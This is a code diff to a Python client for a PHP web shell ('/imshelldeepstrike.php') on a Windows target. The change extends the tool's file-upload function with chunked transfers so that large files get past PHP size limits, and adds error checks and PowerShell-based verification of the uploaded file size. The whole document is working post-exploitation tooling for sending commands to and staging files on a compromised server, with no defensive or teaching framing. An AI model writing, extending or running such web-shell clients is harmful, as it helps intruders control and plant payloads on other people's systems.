@@ -82,18 +82,29 @@ def send_command(cmd: str) -> Tuple[str, Optional[int]]:
     return body, res.status_code
 
 
-def send_upload(file_data: bytes, remote_path: str) -> Tuple[str, Optional[int]]:
+def send_upload(
+    file_data: bytes, remote_path: str, chunk_index: Optional[int] = None
+) -> Tuple[str, Optional[int]]:
     """
-    Upload a file directly via POST with r (base64 data) and n (full remote path) parameters.
+    Upload a file (or chunk) directly via POST with r (base64 data) and n (full remote path) parameters.
     This uses the /imshelldeepstrike.php upload endpoint which saves to the provided remote_path.
+    
+    Args:
+        file_data: The file data (or chunk) to upload
+        remote_path: Full remote path where the file should be saved
+        chunk_index: Optional chunk index (0-based). If None, single upload is assumed.
     """
     b64_data = base64.b64encode(file_data).decode("ascii")
     url = build_url()
+    post_data = {"r": b64_data, "n": remote_path}
+    if chunk_index is not None:
+        post_data["chunk"] = str(chunk_index)
+    
     try:
         if TIMEOUT is None:
-            res = requests.post(url, data={"r": b64_data, "n": remote_path})
+            res = requests.post(url, data=post_data)
         else:
-            res = requests.post(url, data={"r": b64_data, "n": remote_path}, timeout=TIMEOUT)
+            res = requests.post(url, data=post_data, timeout=TIMEOUT)
     except requests.exceptions.Timeout:
         return "request timed out", None
     except requests.exceptions.ConnectionError:
@@ -166,6 +177,7 @@ def upload_file(local_path: str, remote_path: str) -> dict:
     Upload a local file to a **Windows** target using the direct POST upload
     method (r/n parameters) via /imshelldeepstrike.php.
     The file is saved to the full remote_path provided by the user.
+    Large files are automatically chunked to avoid PHP POST size limits.
     """
     path = Path(local_path)
     if not path.is_file():
@@ -177,21 +189,74 @@ def upload_file(local_path: str, remote_path: str) -> dict:
     if total == 0:
         raise ValueError("cannot upload empty file")
 
-    print(
-        f"[upload] starting '{local_path}' -> '{remote_path}' "
-        f"({total} bytes)"
-    )
+    # Determine if we need chunking
+    use_chunking = total > UPLOAD_CHUNK_SIZE
+    num_chunks = (total + UPLOAD_CHUNK_SIZE - 1) // UPLOAD_CHUNK_SIZE if use_chunking else 1
 
-    # Send the file in a single POST request with r (base64 data) and n (full remote path)
-    upload_body, upload_status = send_upload(data, remote_path)
-
-    if upload_status is not None and upload_status != 200:
-        snippet = upload_body[:200] if upload_body else ""
-        raise RuntimeError(
-            f"upload failed with status={upload_status}: {snippet!r}"
+    if use_chunking:
+        print(
+            f"[upload] starting '{local_path}' -> '{remote_path}' "
+            f"({total} bytes, using chunked upload: {num_chunks} chunks of ~{UPLOAD_CHUNK_SIZE} bytes)"
+        )
+    else:
+        print(
+            f"[upload] starting '{local_path}' -> '{remote_path}' "
+            f"({total} bytes)"
         )
 
-    print(f"[upload] sent file ({total} bytes)")
+    last_body: str = ""
+    last_status: Optional[int] = None
+
+    if use_chunking:
+        # Chunked upload
+        offset = 0
+        chunk_index = 0
+        
+        while offset < total:
+            chunk = data[offset : offset + UPLOAD_CHUNK_SIZE]
+            offset += len(chunk)
+            
+            upload_body, upload_status = send_upload(chunk, remote_path, chunk_index)
+            
+            if upload_status is not None and upload_status != 200:
+                snippet = upload_body[:200] if upload_body else ""
+                raise RuntimeError(
+                    f"upload chunk {chunk_index}/{num_chunks} failed "
+                    f"with status={upload_status}: {snippet!r}"
+                )
+            
+            # Check PHP response for errors
+            if upload_body and upload_body.startswith("ERROR:"):
+                raise RuntimeError(
+                    f"upload chunk {chunk_index}/{num_chunks} failed: {upload_body}"
+                )
+            
+            chunk_index += 1
+            progress_pct = int((offset / total) * 100) if total > 0 else 0
+            print(
+                f"[upload] chunk {chunk_index}/{num_chunks} ({len(chunk)} bytes) "
+                f"- {progress_pct}% complete"
+            )
+            
+            last_body = upload_body
+            last_status = upload_status
+    else:
+        # Single upload for small files
+        upload_body, upload_status = send_upload(data, remote_path)
+        
+        if upload_status is not None and upload_status != 200:
+            snippet = upload_body[:200] if upload_body else ""
+            raise RuntimeError(
+                f"upload failed with status={upload_status}: {snippet!r}"
+            )
+        
+        # Check PHP response for errors
+        if upload_body and upload_body.startswith("ERROR:"):
+            raise RuntimeError(f"upload failed: {upload_body}")
+        
+        print(f"[upload] sent file ({total} bytes)")
+        last_body = upload_body
+        last_status = upload_status
 
     # Verify remote size
     remote_ps = ps_escape_single_quotes(remote_path)
@@ -216,9 +281,9 @@ def upload_file(local_path: str, remote_path: str) -> dict:
 
     return {
         "total": total,
-        "chunks": 1,  # Single POST request now
-        "last_body": upload_body,
-        "last_status": upload_status,
+        "chunks": num_chunks,
+        "last_body": last_body,
+        "last_status": last_status,
         "remote_size_text": size_text,
         "remote_size_status": size_status,
         "remote_path": remote_path,
